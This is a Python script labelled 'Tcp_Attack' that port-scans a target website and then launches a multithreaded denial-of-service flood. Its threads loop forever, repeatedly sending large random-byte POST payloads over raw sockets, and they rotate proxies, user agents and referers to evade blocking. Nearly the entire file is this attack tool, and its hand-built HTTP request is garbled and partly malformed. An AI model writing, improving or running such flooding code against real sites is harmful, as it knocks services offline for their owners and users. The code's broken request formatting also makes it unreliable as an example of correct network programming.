import socket,sys,argparse,threading,random,itertools,datetime,json,pathlib,os,string
from urllib.parse import urlparse

class TCP:

    def __init__(self,target_url,list_box=[]):

        self.time_now = datetime.datetime.now()
        self.cycle = itertools.cycle(r"/-\|")
        for date in range(11):
            list_box.append(random.choice(string.digits))
        self.boundary = "--cutting-" + "".join(list_box)
        self.target_url = target_url
        self.domain = urlparse(target_url).netloc
        self.host_ip = socket.gethostbyname(self.domain)
        self.port_path_name = "list_port"
        self.send_path_name = "list_send"
        self.proxy_file_path = "proxy_ua/proxy_list.json"
        self.ua_file_path = "proxy_ua/ua_list.json"
        self.referer_file_path = "referer_json_list/onions.json"

    def port_scan(self,start_port,end_port,list_port=[]):
        try:
            end_port += 1
            for port in range(start_port,end_port):
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as s:
                    open_port = s.connect_ex((self.host_ip,port))
                    s.close()
                    if open_port == 0:
                        list_port.append(port)
                    sys.stdout.write("\r")
                    sys.stdout.write(f"Port_Scan... [{port}] >>> {next(self.cycle)}")
                    sys.stdout.flush()
            hour = self.time_now.hour
            minute = self.time_now.minute
            file_name = f"port_{hour}-{minute}-{self.domain}.json"
            pathlib.Path(self.port_path_name).mkdir(exist_ok=True)
            with open(f"{self.port_path_name}/{file_name}","w+",encoding="utf-8")as f:
                key = {"port_list":list_port}
                f.write(json.dumps(key))
            return f"{self.port_path_name}/{file_name}"
        except KeyboardInterrupt:
            sys.stdout.write("Stop_Port_Scan")
            sys.exit()

    def tcp_attack(self,file_path,send_date,port_date=None,point=0,los_attack=0):
        try:
            hour = self.time_now.hour
            minute = self.time_now.minute
            pathlib.Path(self.send_path_name).mkdir(exist_ok=True)
            file_name = f"{self.send_path_name}/send_{hour}-{minute}.bin"
            with open(f"{file_name}","wb+")as f_bin:
                f_bin.write(random._urandom(int(send_date)))
            port_file = open(file_path,"r",encoding="utf-8")
            port_text = json.loads(port_file.read())

            for port in port_text["port_list"]:
                if int(port) == 80:
                    port_date = 80
                else:
                    port_date = random.choice(port_text["port_list"])

            proxy_file = open(self.proxy_file_path,"r",encoding="utf-8")
            proxy_json = json.loads(proxy_file.read())
            proxy_date = random.choice(proxy_json)["proxy_list"]
            ua_file = open(self.ua_file_path,"r",encoding="utf-8")
            ua_json = json.loads(ua_file.read())
            ua_date = random.choice(ua_json)["user_agent"]
            referer_file = open(self.referer_file_path,"r",encoding="utf-8")
            referer_json = json.loads(referer_file.read())
            referer_date = random.choice(referer_json)["referer"]
            os.environ["http"] = proxy_date.strip("\n")
            os.environ["https"] = proxy_date.strip("\n")
            while True:
                point += 1
                try:
        
                    requests = f"""

                    POST / {self.target_url} HTTP/1.1\r\n/
                    Host : https://{self.host_ip}:{port_date}.strip("\n")\r\n/
                    Content-Length : {send_date}\r\n/
                    Content-Type : multipart/form-data;boundary={self.boundary}\r\n/

                    {self.boundary}\r\n/
                    Content-Disposition : form-date; name="...." :file_name={file_name}\r\n/
                    Content-Type : text/plain\r\n/
                    Content-Tranfer-Encoding : base64\r\n/

                    base64 -b 64 {file_name}\r\n/

                    {self.boundary}\r\n/
                    """
                    
                    with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as s:
                        s.connect((self.host_ip,int(port_date)))
                        s.settimeout(3)
                        s.sendall((requests).encode("utf-8"))
                        for send_attack in range(point):
                            s.sendall((requests).encode("utf-8"))
                        sys.stdout.write("\r")
                        sys.stdout.write(f"Attack >>> [{self.domain}] ... (Los_Attack[{los_attack}]) - {next(self.cycle)}")
                        sys.stdout.flush()
                except TimeoutError or ConnectionError:
                    s.close()
                    proxy_date = random.choice(proxy_json)["proxy_list"]
                    ua_date = random.choice(ua_json)["user_agent"]
                    referer_date = random.choice(referer_json)["referer"]
                    port_date = random.choice(port_text["port_list"])
                    os.environ["http"] = proxy_date.strip("\n")
                    os.environ["https"] = proxy_date.strip("\n")
                    los_attack += 1

                except BrokenPipeError:
                    devnull = os.open(os.devnull, os.O_WRONLY)
                    os.dup2(devnull, sys.stdout.fileno())
                    sys.exit(1)

        except FileNotFoundError:
            sys.stdout.write("EXIT")
            sys.exit()

def main():

    user_message = """
    /***********
    <--Tcp_Attack-->
    ***********/
    [Version 0.5]
    """
    
    arg = argparse.ArgumentParser(description=user_message)

    arg.add_argument("-url",type=str,help="target_url -url <target_url>")
    arg.add_argument("-port",type=int,nargs=2,help="port_scan -port <start_port> <end_port>")
    arg.add_argument("-send",type=int,help="send_date -send <send_date>")
    arg.add_argument("-task",type=int,help="Specify the number of tasks -task <task_date>")

    parse = arg.parse_args()
    tcp = TCP(parse.url)
    start_port,end_port = parse.port[0],parse.port[1]
    port_path  = tcp.port_scan(start_port,end_port)
    
    try:
        for tcp_send in range(int(parse.task)):
            th = threading.Thread(target=tcp.tcp_attack,args=(port_path,parse.send,))
            th.start()
    except KeyboardInterrupt:
        sys.stdout.write("\nStop_Attack!!")
        sys.exit()
if __name__ == "__main__":

    main()
